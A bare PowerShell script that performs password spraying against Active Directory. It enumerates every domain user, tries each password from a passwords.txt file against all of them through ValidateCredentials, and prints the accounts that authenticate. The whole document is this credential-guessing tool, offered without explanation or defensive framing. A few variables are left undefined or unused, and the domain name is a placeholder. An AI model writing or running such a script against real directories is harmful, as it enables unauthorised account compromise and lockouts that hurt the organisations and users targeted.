Import-Module ActiveDirectory  

function Test-ADCredential {
    [CmdletBinding()]
    Param
    (
        [string]$UserName,
        [string]$Password
    )
    if (!($UserName) -or !($Password)) {
        # Write-Warning 'Test-ADCredential: Please specify both user name and password'
    }
    else {
    
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain')
        $result = $DS.ValidateCredentials($UserName, $Password)
        if ($result) {
            write-host $UserName
        }
    }
}


foreach($password in Get-Content .\passwords.txt) {
    if($password -match $regex){
                    $users = $null  
                    write-host Password: $password
                    Get-ADUser -Filter * -Properties userPrincipalName | foreach { Test-ADCredential -username $_.userPrincipalName -password $password   }

    }
}